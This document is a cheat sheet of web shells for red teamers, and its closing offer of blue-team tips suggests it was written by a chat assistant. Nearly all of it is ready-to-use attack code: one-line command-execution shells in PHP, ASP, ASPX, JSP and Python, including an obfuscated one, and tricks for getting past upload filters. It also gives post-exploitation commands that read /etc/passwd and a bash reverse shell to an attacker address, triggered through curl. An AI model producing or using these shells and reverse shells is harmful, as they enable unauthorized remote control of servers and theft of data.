# Web Shell Cheat Sheet for Red Teamers

## 🧬 Simple Web Shells

### PHP One-Liner

```php
<?php system($_GET['cmd']); ?>
```

Access via: `http://target/shell.php?cmd=whoami`

---

### PHP Eval Shell

```php
<?php eval($_REQUEST['cmd']); ?>
```

Dangerous but flexible — supports POST and GET.

---

### PHP Obfuscated Shell

```php
<?php @$_=create_function('',$_POST['_']);@$_(); ?>
```

POST to `shell.php` with: `_=system('id');`

---

### ASP Classic

```asp
<%eval request("cmd")%>
```

---

### ASPX (C# Inline)

```aspx
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe")); %>
```

---

### JSP Shell

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

---

### Python CGI Web Shell

```python
#!/usr/bin/env python3
import cgi, subprocess
form = cgi.FieldStorage()
cmd = form.getvalue('cmd')
print("Content-Type: text/plainn")
print(subprocess.getoutput(cmd))
```

---

## 🕵️‍♂️ Evasion Tricks

### Double Extension

Upload as:  
```
shell.php.jpg  
shell.phtml  
shell.php;.jpg  
```

---

### Content-Type Bypass (Burp)

Intercept and modify:  
```
Content-Type: image/jpeg  
```

…but upload an actual webshell file.

---

### Null Byte Bypass (older PHP)

```
shell.php%00.jpg  
```

---

## 📤 Upload Vector Notes

### Common Upload Locations:
- `/uploads/`
- `/images/`
- `/static/`
- `/public/`
- `/files/`

Use this to hunt webshells after upload:

```bash
find /var/www/ -name "*.php" -mmin -10
```

---

## 🧠 Useful Commands via Web Shell

```bash
whoami  
id  
uname -a  
cat /etc/passwd  
netstat -tulpn  
```

---

## 🛠 Post-Exploitation: Upgrade Your Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

Use Burp or curl to trigger reverse shell:

```bash
curl "http://target/shell.php?cmd=bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261"
```

---

## 🧬 Web Shell Management Tools

- **Weevely**: Encrypted PHP webshell framework  
  ```bash
  weevely generate password shell.php  
  weevely http://target/shell.php password  
  ```

- **Pentestmonkey Shells**:  
  https://github.com/pentestmonkey/php-reverse-shell

---

Let me know if you want to add **detection and cleanup tips** for blue team crossover.

